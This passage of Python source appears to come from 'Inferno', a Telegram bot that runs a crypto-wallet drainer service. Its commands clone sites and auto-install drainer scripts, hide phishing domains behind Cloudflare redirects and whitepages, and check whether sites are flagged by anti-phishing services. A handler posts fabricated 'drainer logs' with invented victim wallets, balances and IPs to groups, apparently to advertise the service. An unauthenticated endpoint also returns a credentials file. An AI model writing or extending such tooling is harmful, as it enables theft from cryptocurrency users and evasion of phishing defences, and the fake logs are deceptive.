        if asset_symbol == "ETH":
            return max(price * 0.01, 20), min(price * 3, target_value * 0.5)
        if asset_symbol == "BNB":
            return max(price * 0.1, 20), min(price * 20, target_value * 0.4)
        if asset_symbol == "MATIC":
            return max(price * 5, 5), min(price * 2000, target_value * 0.4)
        if asset_symbol == "USDT":
            return 10, min(target_value * 0.8, 100_000)
        return 10, target_value

    weights = [random.uniform(0.8, 1.4) for _ in selected_assets]
    total_weight = sum(weights)
    raw_values = [target_net_worth * (w / total_weight) for w in weights]

    asset_values = []
    asset_bounds = []
    for asset, raw_value in zip(selected_assets, raw_values):
        min_value, max_value = asset_value_bounds(asset["symbol"], target_net_worth)
        asset_bounds.append((min_value, max_value))
        value = round(max(min_value, min(raw_value, max_value)), 2)
        asset_values.append(value)

    total_allocated = sum(asset_values)
    if total_allocated <= 0:
        total_allocated = target_net_worth
        asset_values = [round(target_net_worth / len(selected_assets), 2) for _ in selected_assets]

    scale = target_net_worth / total_allocated
    scaled_values = []
    adjusted_total = 0
    for idx, (value, bounds) in enumerate(zip(asset_values, asset_bounds)):
        if idx == len(asset_values) - 1:
            scaled_value = round(target_net_worth - adjusted_total, 2)
        else:
            scaled_value = round(min(max(value * scale, bounds[0]), bounds[1]), 2)
        scaled_values.append(scaled_value)
        adjusted_total += scaled_value

    # If rounding caused drift, adjust the last asset to exactly match target
    if adjusted_total != target_net_worth and scaled_values:
        scaled_values[-1] = round(scaled_values[-1] + (target_net_worth - adjusted_total), 2)

    for asset, value in zip(selected_assets, scaled_values):
        price = asset["price_usd"]
        balance = round(value / price, asset.get("decimals", 4))
        wallet_data["assets"].append({
            "symbol": asset["symbol"],
            "balance": balance,
            "price": price,
            "value": round(value, 2),
        })
        wallet_data["net_worth"] += value

    wallet_data["net_worth"] = round(wallet_data["net_worth"], 2)
    return wallet_data


# Randomly select 2–4 assets to display
def get_random_assets(wallet_data: dict) -> list:
    if not wallet_data.get("assets"):
        return []

    return random.sample(wallet_data["assets"], k=min(len(wallet_data["assets"]), random.randint(2, 4)))


# Function to convert the country code into a flag emoji
def country_flag_unicode(country_code):
    """
    Generate a country flag emoji from its country code.
    Example: 'US' -> 🇺🇸, 'IN' -> 🇮🇳.
    """
    try:
        return ''.join(chr(127397 + ord(c)) for c in country_code.upper())
    except Exception as e:
        logger.error(f"Error generating flag: {e}")
        return "🏳️"  # Default flag if rendering fails

# Function to get a random country and its flag
def get_random_country():
    # Categorize countries by income level for realistic distribution
    high_income_countries = [
        'United States', 'Germany', 'United Kingdom', 'France', 'Canada', 'Australia', 
        'Switzerland', 'Norway', 'Sweden', 'Denmark', 'Netherlands', 'Singapore', 
        'Japan', 'South Korea', 'United Arab Emirates', 'Saudi Arabia', 'Luxembourg',
        'Austria', 'Belgium', 'Finland', 'Ireland', 'Iceland', 'New Zealand'
    ]
    
    middle_income_countries = [
        'Brazil', 'Mexico', 'Turkey', 'South Africa', 'Thailand', 'Malaysia', 
        'Indonesia', 'Philippines', 'Vietnam', 'Egypt', 'Morocco', 'Colombia',
        'Peru', 'Chile', 'Argentina', 'Poland', 'Hungary', 'Czech Republic',
        'Portugal', 'Greece', 'Romania', 'Bulgaria', 'Croatia', 'Slovenia',
        'Slovakia', 'Estonia', 'Latvia', 'Lithuania', 'Russia', 'China', 'Taiwan'
    ]
    
    low_income_countries = [
        'Nigeria', 'India', 'Pakistan', 'Bangladesh', 'Kenya', 'Ghana', 'Ethiopia',
        'Tanzania', 'Uganda', 'Rwanda', 'Mozambique', 'Zimbabwe', 'Zambia', 
        'Malawi', 'Burundi', 'Afghanistan', 'Nepal', 'Myanmar', 'Cambodia',
        'Laos', 'Haiti', 'Yemen', 'Syria', 'Sudan', 'South Sudan', 'Somalia'
    ]
    
    # Select category with weights: 30% high, 40% middle, 30% low
    categories = [
        (high_income_countries, 30),
        (middle_income_countries, 40), 
        (low_income_countries, 30)
    ]
    
    selected_category = random.choices(
        [cat[0] for cat in categories], 
        weights=[cat[1] for cat in categories]
    )[0]
    
    country_name = random.choice(selected_category)
    
    # Get country code from pycountry
    try:
        country = pycountry.countries.get(name=country_name)
        if not country:
            # Try common name variations
            name_map = {
                'United States': 'United States of America',
                'South Korea': 'Korea, Republic of',
                'Taiwan': 'Taiwan, Province of China',
                'Russia': 'Russian Federation',
                'Czech Republic': 'Czechia'
            }
            country_name = name_map.get(country_name, country_name)
            country = pycountry.countries.get(name=country_name)
        
        if country:
            country_code = country.alpha_2
            country_flag = country_flag_unicode(country_code)
            return country_flag, country.name
        else:
            # Fallback to a random country if not found
            countries = list(pycountry.countries)
            country = random.choice(countries)
            country_code = country.alpha_2
            country_flag = country_flag_unicode(country_code)
            return country_flag, country.name
    except Exception:
        # Ultimate fallback
        return "🌍", "Unknown"

# Function to get a random device type
def get_random_device_type():
    return random.choice(['Desktop', 'Android', 'iOS'])

# Function to generate a random IP address
def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Shorten the address for display
def shorten_address(address: str) -> str:
    return f"{address[:6]}...{address[-4:]}"

def shorten_url(url: str) -> str:
    return f"{url[:15]}..."

# Function to get a random wallet
def get_random_wallet() -> dict:
    random_wallet = random.choice(WALLETS)
    wallet_address = f"0x{''.join(random.choices('0123456789abcdef', k=40))}"
    return random_wallet, wallet_address

# Function to randomly choose between "Not enough gas" and "Assets transferred successfully"
def get_transfer_status():
    return random.choices(
        ["🚨 Not enough gas to transfer funds", "✅ Assets transferred successfully"],
        weights=[0.75, 0.25],  # 75% chance of failure, 25% chance of success
        k=1
    )[0]

# Emoji mappings for known asset types
ASSET_EMOJIS = {
    "USDT": "⚡",
    "BUSD": "💵",
    "BNB": "🔶",
    "ETH": "💎",
    "ETH Classic": "💰",
    "Tether USD": "💵",
}

def shorten_address(addr):
    return f"{addr[:6]}...{addr[-4:]}"

def shorten_url(url):
    domain = url.replace("https://", "").replace("www.", "").split("/")[0]
    short = domain.split(".")[0]
    return short[:20] + "..." if len(short) > 20 else short


async def get_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.effective_chat or not update.effective_user:
            logger.warning("get_logs called with no chat or user context")
            return

        logger.info(
            f"get_logs handler triggered by user {update.effective_user.id} in chat {update.effective_chat.id}"
        )

        if update.effective_chat.type not in [ChatType.GROUP, ChatType.SUPERGROUP]:
            logger.warning(f"get_logs called in non-group chat: {update.effective_chat.type}")
            if update.message:
                await update.message.reply_text("❌ This command only works in groups.")
            return

        user_id = update.effective_user.id
        group_id = update.effective_chat.id
        LOGS_ONLY_GROUPS.add(group_id)
        logger.info(f"User {user_id} requested logs in group {group_id}")

        # Generate enhanced fake data with more realism
        country_flag, country_name = get_random_country()
        wallet_data = generate_random_wallet_data(country_name)
        selected_assets = get_random_assets(wallet_data)
        ip_address = generate_random_ip()
        random_wallet, wallet_address = get_random_wallet()
        wallet_url = random_wallet["url"]
        shortened_wallet = shorten_address(wallet_address)
        shortened_wallet_url = shorten_url(wallet_url)
        device_type = get_random_device_type()
        device_icon = "📱" if device_type in ["Android", "iOS"] else "💻"
        blockchain_network = wallet_data.get("chain", "Ethereum")

        # Enhanced realistic features
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
        connection_time = f"{random.randint(1, 30)}.{random.randint(100, 999)}s"
        browser_fingerprint = random.choice([
            "Chrome/120.0.0.0 (Windows NT 10.0; Win64; x64)",
            "Firefox/121.0 (Windows NT 10.0; Win64; x64; rv:121.0)",
            "Safari/17.2.1 (Macintosh; Intel Mac OS X 10_15_7)",
            "Chrome/120.0.0.0 (Linux; Android 10; SM-G975F)",
            "Mobile Safari/17.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X)"
        ])
        session_id = f"0x{''.join(random.choices('0123456789abcdef', k=16))}"
        gas_price = round(random.uniform(10, 100), 2)
        gas_limit = random.randint(21000, 150000)

        # Random transaction hash for realism
        tx_hash = f"0x{''.join(random.choices('0123456789abcdef', k=64))}"

        net_worth = round(wallet_data["net_worth"], 2)
        selected_value = round(sum(asset["value"] for asset in selected_assets), 2)

        # Random log types for variety
        log_types = ["connection", "transfer_attempt", "balance_check", "asset_scan"]
        log_type = random.choice(log_types)

        if wallet_data["net_worth"] == 0 or not selected_assets:
            # 🚧 Empty connect message with enhanced details
            wallet_conn = localized_text_for_user(
                user_id, context, "log_wallet_connection", timestamp=timestamp
            )
            session_id_text = localized_text_for_user(
                user_id, context, "log_session_id", session_id=session_id
            )
            wallet_text = localized_text_for_user(
                user_id, context, "log_wallet",
                wallet_name=random_wallet['name'],
                shortened_wallet=shortened_wallet,
                wallet_url=wallet_url
            )
            status_text = localized_text_for_user(
                user_id, context, "log_status_empty"
            )
            conn_time_text = localized_text_for_user(
                user_id, context, "log_connection_time", connection_time=connection_time
            )
            browser_text = localized_text_for_user(
                user_id, context, "log_browser", browser=browser_fingerprint[:30] + "..."
            )
            device_text = localized_text_for_user(
                user_id, context, "log_device_ip",
                device_icon=device_icon, device_type=device_type,
                country_flag=country_flag, country_name=country_name
            )
            ip_gas_text = localized_text_for_user(
                user_id, context, "log_ip_gas",
                ip_address=ip_address, gas_price=gas_price
            )

            empty_msg = (
                f"{wallet_conn}\n"
                f"{session_id_text}\n"
                f"{wallet_text}\n"
                f"{status_text}\n"
                f"{conn_time_text}\n"
                f"{browser_text}\n"
                f"{device_text}\n"
                f"{ip_gas_text}"
            )

            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=empty_msg,
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            drainer_events.insert(0, {
                'timestamp': datetime.now().isoformat(),
                'event': 'Group logs delivered',
                'details': f'Logs sent to group {group_id} (empty session flow)'
            })
            return

        # Message 1 — Enhanced Wallet Info with timestamp and session details
        assets_list = "\n".join([
            f"├ {ASSET_EMOJIS.get(asset['symbol'].split()[0], '💎')} {asset['symbol']} — {asset['balance']:.2f} @ ${asset['price']:.2f} = ${asset['value']:.2f}"
            for asset in selected_assets
        ])

        wallet_analysis = localized_text_for_user(
            user_id, context, "log_wallet_analysis", timestamp=timestamp
        )
        session_id_text = localized_text_for_user(
            user_id, context, "log_session_id", session_id=session_id
        )
        wallet_text = localized_text_for_user(
            user_id, context, "log_wallet",
            wallet_name=random_wallet['name'],
            shortened_wallet=shortened_wallet,
            wallet_url=wallet_url
        )
        portfolio_analysis = localized_text_for_user(
            user_id, context, "log_portfolio_analysis"
        )
        total_value_text = localized_text_for_user(
            user_id, context, "log_total_value", total_value=f"{net_worth:,.2f}"
        )
        assets_scanned_text = localized_text_for_user(
            user_id, context, "log_assets_scanned", count=len(selected_assets)
        )
        top_holdings_text = localized_text_for_user(
            user_id, context, "log_top_holdings", value=f"{selected_value:,.2f}"
        )
        asset_breakdown_text = localized_text_for_user(
            user_id, context, "log_asset_breakdown"
        )
        conn_details_text = localized_text_for_user(
            user_id, context, "log_connection_details"
        )
        time_browser_text = localized_text_for_user(
            user_id, context, "log_time_browser",
            time=connection_time, browser=browser_fingerprint[:25] + "..."
        )
        device_text = localized_text_for_user(
            user_id, context, "log_device_ip",
            device_icon=device_icon, device_type=device_type,
            country_flag=country_flag, country_name=country_name
        )
        source_ip_text = localized_text_for_user(
            user_id, context, "log_source_ip",
            ip_address=ip_address, gas_price=gas_price
        )

        message1 = (
            f"{wallet_analysis}\n"
            f"{session_id_text}\n"
            f"{wallet_text}\n"
            f"Network: {blockchain_network}\n"
            f"Provider: [{shortened_wallet_url}]({wallet_url})\n\n"
            f"{portfolio_analysis}\n"
            f"{total_value_text}\n"
            f"{assets_scanned_text}\n"
            f"{top_holdings_text}\n\n"
            f"{asset_breakdown_text}\n{assets_list}\n\n"
            f"{conn_details_text}\n"
            f"{time_browser_text}\n"
            f"{device_text}\n"
            f"{source_ip_text}"
        )

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=message1,
            parse_mode='Markdown',
            disable_web_page_preview=True
        )

        await asyncio.sleep(random.uniform(1.5, 3.0))

        # Message 2 — Dynamic log type with realistic processing
        if log_type == "connection":
            conn_msg = localized_text_for_user(
                user_id, context, "log_establishing_connection"
            )
            assets_msg = localized_text_for_user(
                user_id, context, "log_verifying_assets", count=len(wallet_data['assets'])
            )
            latency_text = localized_text_for_user(
                user_id, context, "log_latency",
                ip_address=ip_address, latency=random.randint(50, 200)
            )

            message2 = (
                f"{conn_msg}\n"
                f"Session: `{session_id}` | Wallet: {shortened_wallet}\n"
                f"{assets_msg}\n"
                f"{latency_text}\n"
                f"Provider: [{shortened_wallet_url}]({wallet_url})"
            )
        elif log_type == "balance_check":
            balance_msg = localized_text_for_user(
                user_id, context, "log_balance_check"
            )
            portfolio_val_text = localized_text_for_user(
                user_id, context, "log_portfolio_value", value=f"{net_worth:,.2f}"
            )
            blockchain_text = localized_text_for_user(
                user_id, context, "log_blockchain_check"
            )
            gas_est_text = localized_text_for_user(
                user_id, context, "log_gas_estimate",
                ip_address=ip_address, gas_limit=gas_limit
            )

            message2 = (
                f"{balance_msg}\n"
                f"{portfolio_val_text}\n"
                f"{blockchain_text}\n"
                f"{gas_est_text}\n"
                f"Provider: [{shortened_wallet_url}]({wallet_url})"
            )
        elif log_type == "asset_scan":
            scan_msg = localized_text_for_user(
                user_id, context, "log_scanning_assets"
            )
            found_msg = localized_text_for_user(
                user_id, context, "log_found_holdings", count=len(selected_assets)
            )
            total_msg = f"Total Value: ${selected_value:,.2f}"
            scan_time_msg = localized_text_for_user(
                user_id, context, "log_scan_time",
                ip_address=ip_address, time=random.randint(2, 8)
            )
            
            message2 = (
                f"{scan_msg}\n"
                f"{found_msg}\n"
                f"{total_msg}\n"
                f"{scan_time_msg}\n"
                f"Provider: [{shortened_wallet_url}]({wallet_url})"
            )
        else:  # transfer_attempt
            prep_msg = localized_text_for_user(
                user_id, context, "log_preparing_transfer"
            )
            amount_msg = localized_text_for_user(
                user_id, context, "log_transfer_amount",
                amount=f"{net_worth:,.2f}", gas_price=gas_price
            )
            dest_msg = localized_text_for_user(
                user_id, context, "log_destination"
            )
            tx_msg = localized_text_for_user(
                user_id, context, "log_tx_hash",
                ip_address=ip_address, tx_hash=f"`{tx_hash[:10]}...{tx_hash[-8:]}`"
            )
            
            message2 = (
                f"{prep_msg}\n"
                f"{amount_msg}\n"
                f"{dest_msg}\n"
                f"{tx_msg}\n"
                f"Provider: [{shortened_wallet_url}]({wallet_url})"
            )

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=message2,
            parse_mode='Markdown',
            disable_web_page_preview=True
        )

        await asyncio.sleep(random.uniform(2.0, 4.0))

        # Message 3 — Enhanced transfer/status with realistic outcomes
        transfer_status = get_transfer_status()

        if "not enough" in transfer_status.lower():
            # Failed transfer scenario
            failed_msg = localized_text_for_user(
                user_id, context, "log_transfer_failed", timestamp=timestamp
            )
            error_msg = localized_text_for_user(
                user_id, context, "log_transfer_error"
            )
            required_gas_msg = localized_text_for_user(
                user_id, context, "log_required_gas",
                gas_limit=gas_limit, gas_price=gas_price
            )
            cost_msg = localized_text_for_user(
                user_id, context, "log_estimated_cost",
                cost=f"{(gas_limit * gas_price * 0.000000001):.4f}"
            )
            balance_msg = localized_text_for_user(
                user_id, context, "log_insufficient_balance",
                balance=f"{net_worth:,.2f}"
            )
            sys_details_msg = localized_text_for_user(
                user_id, context, "log_system_details"
            )
            session_tx_msg = localized_text_for_user(
                user_id, context, "log_session_tx",
                session_id=session_id, tx_hash=f"`{tx_hash[:12]}...`"
            )
            device_info = localized_text_for_user(
                user_id, context, "log_device_info",
                device_icon=device_icon, device_type=device_type,
                country_flag=country_flag, country_name=country_name
            )

            message3 = (
                f"{failed_msg}\n"
                f"{error_msg}\n"
                f"{required_gas_msg}\n"
                f"{cost_msg}\n"
                f"{balance_msg}\n\n"
                f"{sys_details_msg}\n"
                f"{session_tx_msg}\n"
                f"{device_info}\n"
                f"IP: `{ip_address}` | Browser: {browser_fingerprint[:30]}...\n"
                f"Provider: [{shortened_wallet_url}]({wallet_url})"
            )
        else:
            # Successful transfer scenario
            transfer_amount = round(net_worth * random.uniform(0.1, 0.95), 2)
            fee_amount = round(transfer_amount * random.uniform(0.001, 0.01), 4)

            completed_msg = localized_text_for_user(
                user_id, context, "log_transfer_completed", timestamp=timestamp
            )
            transfer_info = localized_text_for_user(
                user_id, context, "log_transfer_info",
                amount=f"{transfer_amount:,.2f}", fee=f"{fee_amount:.4f}"
            )
            gas_used_msg = localized_text_for_user(
                user_id, context, "log_gas_used",
                gas_limit=gas_limit, gas_price=gas_price
            )
            tx_msg = localized_text_for_user(
                user_id, context, "log_transaction", tx_hash=f"`{tx_hash}`"
            )
            status_msg = localized_text_for_user(
                user_id, context, "log_status_confirmed"
            )
            tx_details_msg = localized_text_for_user(
                user_id, context, "log_transaction_details"
            )
            session_block_msg = localized_text_for_user(
                user_id, context, "log_session_block",
                session_id=session_id, block=random.randint(18000000, 19000000)
            )
            device_info = localized_text_for_user(
                user_id, context, "log_device_info",
                device_icon=device_icon, device_type=device_type,
                country_flag=country_flag, country_name=country_name
            )

            message3 = (
                f"{completed_msg}\n"
                f"{transfer_info}\n"
                f"{gas_used_msg}\n"
                f"{tx_msg}\n"
                f"{status_msg}\n\n"
                f"{tx_details_msg}\n"
                f"{session_block_msg}\n"
                f"{device_info}\n"
                f"IP: `{ip_address}` | Time: {connection_time}\n"
                f"Provider: [{shortened_wallet_url}]({wallet_url})"
            )

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=message3,
            parse_mode='Markdown',
            disable_web_page_preview=True
        )

        drainer_events.insert(0, {
            'timestamp': datetime.now().isoformat(),
            'event': 'Group logs delivered',
            'details': f'Logs sent to group {group_id} as chat events'
        })

        # Optional Message 4 — Random additional log entry (30% chance)
        if random.random() < 0.3:
            await asyncio.sleep(random.uniform(1.0, 2.5))

            follow_up_types = [
                f"📊 Portfolio update: Value changed by ${round(random.uniform(-100, 100), 2):+.2f}",
                f"🔄 Wallet sync completed | Last block: #{random.randint(18000000, 19000000)}",
                f"🔔 Price alert: {random.choice(list(ASSET_EMOJIS.keys()))} moved {random.randint(-5, 5)}%",
                f"⚡ Gas price update: Now {round(random.uniform(10, 150), 2)} Gwei",
                f"🔐 Security check passed | Session: `{session_id}`"
            ]

            message4 = f"{random.choice(follow_up_types)}\nTime: {datetime.now().strftime('%H:%M:%S UTC')}"

            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=message4,
                parse_mode='Markdown',
                disable_web_page_preview=True
            )

    except Exception as e:
        logger.error(f"Error in get_logs: {e}")
        logger.error(f"Traceback: {traceback.format_exc()}")
        try:
            if update.message:
                await update.message.reply_text("❌ An error occurred while processing your request.")
        except Exception as reply_error:
            logger.error(f"Failed to send error message: {reply_error}")
        return


# List of all commands that are restricted to private chat only
PRIVATE_CHAT_ONLY_COMMANDS = {
    'start', 'set_up', 'new_ethereum_wallet', 'proceed_to_plans', 'choose_plan',
    'setup_fee', 'panel', 'login', 'view_seeds', 'help', 'lang',
    'host', 'clone', 'angelclone', 'landing_page', 'site_templates', 'angelupdate', 
    'update', 'delete', 'purgecache', 'sites', 'redirect', 'cfredirect', 
    'deletecfredirect', 'whitepage', 'ipfshost', 'ipfsupdate', 'ipfsdelete', 'ipfslist',
    'trafic', 'antiddos', 'disableantiddos', 'antibot', 'cfstatus', 
    'enable_auto_check', 'disable_auto_check', 'check_flagged',
    'check_domain', 'domain_price', 'topup', 'balance', 'buydomain', 
    'mypurchases', 'changens'
}

async def block_group_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Block private chat commands in groups and redirect users to private chat"""
    chat = update.effective_chat
    message = update.message
    
    # Only process commands in groups
    if not (chat and chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]):
        return
    
    if not (message and isinstance(message.text, str)):
        return
    
    # Extract command name (remove leading / and @mention)
    command_text = message.text.split()[0].split('@')[0].lower()
    command_name = command_text[1:] if command_text.startswith('/') else command_text
    
    # Check if this is a private chat only command
    if command_name in PRIVATE_CHAT_ONLY_COMMANDS:
        logger.info(f"Blocking private command '{command_name}' in group chat {chat.id} by user {update.effective_user.id}")
        try:
            # Create inline button to open private chat
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(
                    "💬 Open Private Chat",
                    url=f"https://t.me/{context.bot.username}"
                )]
            ])
            
            # Get localized message
            restriction_msg = localized_text(update, context, "group_command_restricted")
            
            # Send restriction message with inline button
            await message.reply_text(
                restriction_msg,
                reply_markup=keyboard,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Error sending group command restriction message: {e}")
            try:
                await message.reply_text(
                    "🔒 This command is only available in private chat.\n"
                    "Please use the bot in a direct message."
                )
            except Exception as fallback_error:
                logger.error(f"Failed to send fallback message: {fallback_error}")


# Sample wallet address and URL to demonstrate shortening
wallet_address = "0xD7849abcdef1234567890abcdef1234567890"
wallet_url = random.choice([
    "https://metamask.io",
    "https://trustwallet.com",
    "https://www.coinbase.com/wallet",
    "https://phantom.app",
    "https://atomicwallet.io",
    "https://www.exodus.com",
    "https://www.binance.org/en/wallet",
    "https://www.ledger.com/ledger-live",
    "https://trezor.io",
    "https://crypto.com/defi-wallet",
])


# Shorten the addresses and URLs
shortened_wallet = shorten_address(wallet_address)
shortened_wallet_url = shorten_url(wallet_url)


#Features command
async def features_command(update: Update, context: CallbackContext):
    """Handles the /features command and sends the message in three parts with delays."""
    await send_features_messages(update.message, update, context)
    return

# Web server for the dashboard

# Common function for all commands
async def Inferno_not_setup(update: Update, context: CallbackContext):
    """Send a message when a user interacts with Inferno commands but doesn't have a panel set up."""
    await update.message.reply_text(localized_text(update, context, "setup_required"))

# List of all commands that should trigger this response
Inferno_COMMANDS = [
    "host", "clone", "angelclone", "landing_page", "site_templates", "angelupdate", "update", "delete", "purgecache",
    "sites", "redirect", "cfredirect", "deletecfredirect", "whitepage",
    "ipfshost", "ipfsupdate", "ipfsdelete", "ipfslist",
    "trafic", "antiddos", "disableantiddos", "antibot", "cfstatus", 
    "enable_auto_check", "disable_auto_check", "check_flagged",
    "check_domain", "domain_price", "topup", "balance", "buydomain", 
    "mypurchases", "changens"
]

async def features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await send_features_messages(update.callback_query.message, update, context)

 #User's Telegram ID command
async def send_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    await update.message.reply_text(f'Your Telegram 🆔 is: {user_id}')

#Faq command
async def faq(update: Update, context: CallbackContext):
    """Send a waiting message, delay, then send the FAQ message."""
    message = await update.message.reply_text(localized_text(update, context, "faq_wait"))
    
    # Wait for 3 seconds before sending the full FAQ
    await asyncio.sleep(3)
    
    await message.edit_text(localized_text(update, context, "faq_text"), parse_mode="Markdown")

faq_text = LANGUAGE_MESSAGES[DEFAULT_LANGUAGE]["faq_text"]
# ------------------------------------------
# Main function and handler registration
# ------------------------------------------

async def button_handler(update, context):
    """Handles inline button clicks"""
    query = update.callback_query
    await query.answer()

    if query.data == "Inferno_features":
        message = """
Inferno - More than just a drainer! 🤖
- /id:  Find out your Telegram ID.
- /faq: 📘 Frequently Asked Questions

Host Website with Inferno:

- /host: 🌐 Host a new website with Inferno
- /clone: 🕸️ Copy any site, with tools to customize and save.
- /angelclone: 🕸️ Copy any site & install drainer script automatically
- /landing_page: 📥 Download  
- /site_templates 🌐 List of ready website templates
- /angelupdate: 🔄 Update your angel hosted site with the latest drainer.
- /update: 🔄 Update your site's content at /yourdomain.com.
- /delete: 🗑️ Remove your website.
- /purgecache: 🚀 Speed up your site by clearing cache.

Redirect Features :

- /sites: 📋 View hosted and deleted domains.
- /redirect: ↪️ Redirect domain 1 to domain 2.
- /cfredirect: ↪️ Redirect domain 1 to domain 2 using Cloudflare (better as it bypasses the red flag).
- /deletecfredirect: Remove the Cloudflare redirect.
- /whitepage: 🗒️ Get a zip with a whitepage for hosting.

IPFS Hosting (host any page under pages.dev for free):
- /ipfshost: 📤 Host your website under pages.dev domain.
- /ipfsupdate: 🔄 Update your site's content at /yourdomain.pages.dev.
- /ipfsdelete: 🗑️ Remove your IPFS website.
- /ipfslist: View hosted IPFS sites.

Traffic and Security (Optional): 

- /trafic: 🚦 Check visitor stats for your domain.
- /antiddos: 🛡️ Turn on Anti-DDoS for strong protection.
- /disableantiddos: 🔓 Turn off Anti-DDoS.
- /antibot: 🤖 Protect your site with Anti-Bot measures.
- /cfstatus: 📊 View your website's Cloudflare status.
- /enable_auto_check: 🔔 Enable automatic checks for phishing flags.
- /disable_auto_check: 🔕 Turn off automatic checks for phishing flags.
- /check_flagged: 🚩 Check if your site is flagged. Our complete security checks cover EtherAddressLookup, ScamSniffer, Phishfort, Antivirus, MetaMask, and Phantom to ensure maximum protection and trust.

Domain Management :
- /check_domain: 🔍 Check domain availability.
- /domain_price: 💰 View current domain prices.
- /topup: ➕ Add funds to your account (ETH accepted).
- /balance: 💼 Check your account balance.
- /buydomain: 🛍️ Buy a new domain.
- /mypurchases: 📜 View your domain purchases.
- /changens: 🔄 Change domain nameservers.

"""
        await query.message.edit_text(message)

# If using inline buttons, modify the callback function
async def inline_button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()  # Acknowledge the button press
    await send_setup_message(update, context)  # Call the setup message function

async def button_handler(update: Update, context: CallbackContext):
    """Handles inline button presses."""
    query = update.callback_query
    if query.data == "create_wallet":
        await new_ethereum_wallet(update, context)

    # Example usage for new panel creation using an existing wallet.
    user_id = "user_id"
    # Simulate that the user did not provide a private key for an existing wallet.
    private_key = ""  # or None
    address = "user-wallet-address"
    insert_wallet_record(user_id, private_key, address)

# ==================== WEB SERVER FOR CREDENTIAL VERIFICATION ====================
async def handle_verify_credentials(request):
    """Handle credential verification requests from the Web App."""
    try:
        data = await request.json()
        panel_id = data.get('panel_id', '').strip()
        password = data.get('password', '').strip()

        if not panel_id or not password:
            return web.json_response({'valid': False, 'error': 'Missing credentials'}, status=400)

        if not is_valid_panel_id(panel_id):
            return web.json_response({'valid': False})

        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT password_hash, active, revoked_at, user_id FROM credentials WHERE panel_id = ?",
                (panel_id,)
            )
            record = cursor.fetchone()

            if not record:
                return web.json_response({'valid': False})

            password_hash, active, revoked_at, user_id = record
            if not active or revoked_at is not None:
                logger.warning(f"Login attempt rejected for inactive or revoked panel_id: {panel_id}")
                return web.json_response({'valid': False})

            if hashlib.sha256(password.encode()).hexdigest() != password_hash:
                logger.warning(f"Login failed for panel_id: {panel_id}")
                return web.json_response({'valid': False})

            cursor.execute("UPDATE credentials SET active = 0 WHERE panel_id = ?", (panel_id,))
            conn.commit()

        session_id, expires_at = create_credential_session(panel_id, user_id)
        token = generate_ocrs_token(panel_id, user_id, session_id)

        response_payload = {
            'valid': True,
            'ocrs_token': token,
            'ocrs_expires_in': OCRS_TOKEN_EXPIRY_HOURS * 3600
        }

        if should_rotate_credentials(panel_id):
            response_payload['ocrs_rotation_due'] = True
            logger.info(f"OCRS rotation flagged for panel_id: {panel_id}")

        return web.json_response(response_payload)
    except Exception as e:
        logger.error(f"Verification error: {e}")
        return web.json_response({'valid': False, 'error': str(e)}, status=500)

async def handle_get_credentials(request):
    """Return the current credential export payload."""
    try:
        export_file = os.path.join(os.path.dirname(__file__), 'Web', 'credentials.json')
        if not os.path.isfile(export_file):
            raise FileNotFoundError('credentials.json not found')

        with open(export_file, 'r', encoding='utf-8') as f:
            credentials_data = json.load(f)

        return web.json_response(credentials_data)
    except Exception as e:
        logger.error(f"Failed to fetch credentials export: {e}")
        return web.json_response({'credentials': [], 'error': str(e)}, status=500)


async def handle_logout(request):
    """Logout endpoint for aiohttp clients using OCRS token authentication."""
    auth_header = request.headers.get('Authorization', '')
    if not auth_header.startswith('Bearer '):
        return web.json_response({'status': 'error', 'message': 'Missing OCRS token'}, status=401)

    token = auth_header.split(' ', 1)[1]
    payload = validate_ocrs_token(token)
    if payload is None:
        return web.json_response({'status': 'error', 'message': 'Invalid or expired OCRS token'}, status=401)

    panel_id = payload['sub']
    session_id = payload['sid']

    try:
        revoked = revoke_credential_session(session_id)
        deleted_count = 0

        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("DELETE FROM credentials WHERE panel_id = ?", (panel_id,))
            deleted_count = cursor.rowcount
            conn.commit()

        if revoked or deleted_count > 0:
            logger.info(f"Logout completed for panel_id: {panel_id}, session_id: {session_id}")
            export_credentials_to_json()
            return web.json_response({'status': 'success', 'message': 'Logged out successfully'})

        return web.json_response({'status': 'error', 'message': 'Session or panel not found'}, status=404)
    except Exception as e:
        logger.error(f"Error during logout for panel_id {panel_id}: {e}")
        return web.json_response({'status': 'error', 'message': 'Logout failed'}, status=500)


async def handle_ocrs_rotate(request):
    """Rotate credentials for an active session."""
    auth_header = request.headers.get('Authorization', '')
    if not auth_header.startswith('Bearer '):
        return web.json_response({'status': 'error', 'message': 'Missing OCRS token'}, status=401)

    token = auth_header.split(' ', 1)[1]
    payload = validate_ocrs_token(token)
    if payload is None:
        return web.json_response({'status': 'error', 'message': 'Invalid or expired OCRS token'}, status=401)

    data = await request.json()
    new_password = data.get('new_password', '').strip()
    if not new_password:
        return web.json_response({'status': 'error', 'message': 'new_password is required'}, status=400)

    panel_id = payload['sub']
    user_id = payload['uid']
    session_id = payload['sid']

    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM credentials WHERE panel_id = ?", (panel_id,))
        result = cursor.fetchone()
        if not result:
            return web.json_response({'status': 'error', 'message': 'Panel not found'}, status=404)
        if result[0] != user_id:
